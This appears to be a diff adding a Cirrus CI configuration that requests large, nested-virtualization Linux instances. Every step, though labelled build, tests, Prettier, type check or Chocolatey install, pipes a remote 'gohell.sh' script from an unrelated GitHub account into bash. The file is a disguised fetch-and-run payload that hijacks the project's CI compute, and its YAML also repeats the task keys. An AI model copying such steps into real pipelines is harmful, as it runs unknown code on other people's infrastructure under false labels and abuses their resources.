@@ -1,0 +1,47 @@
+task:
+  use_compute_credits: true
+  name: Test linux
+  alias: Tests
+  compute_engine_instance:
+    image_project: cirrus-images # GCP project.
+    image: family/docker-kvm # family or a full image name.
+    platform: linux
+    architecture: amd64 # optional. By default, amd64 is assumed.
+    cpu: 8 # optional. Defaults to 2 CPUs.
+    memory: 16G # optional. Defaults to 4G.
+    disk: 100 # optional. By default, uses the smallest disk size required by the image.
+    nested_virtualization: true
+  matrix:
+    - name: Build
+      build_script: curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+    - name: Tests
+      test_script: curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+    - name: Prettier
+      prettier-check_script: curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+    - name: Type Check
+      typecheck_script: curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+  
+  enable_linux_containers_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+  install_chocolatey_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+  test_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+    
+  name: Test linux2
+  alias: Tests
+  compute_engine_instance:
+    image_project: cirrus-images # GCP project.
+    image: family/docker-kvm # family or a full image name.
+    platform: linux
+    architecture: amd64 # optional. By default, amd64 is assumed.
+    cpu: 8 # optional. Defaults to 2 CPUs.
+    memory: 16G # optional. Defaults to 4G.
+    disk: 100 # optional. By default, uses the smallest disk size required by the image.
+    nested_virtualization: true
+  enable_linux_containers_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+  install_chocolatey_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
+  test_script:
+    - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
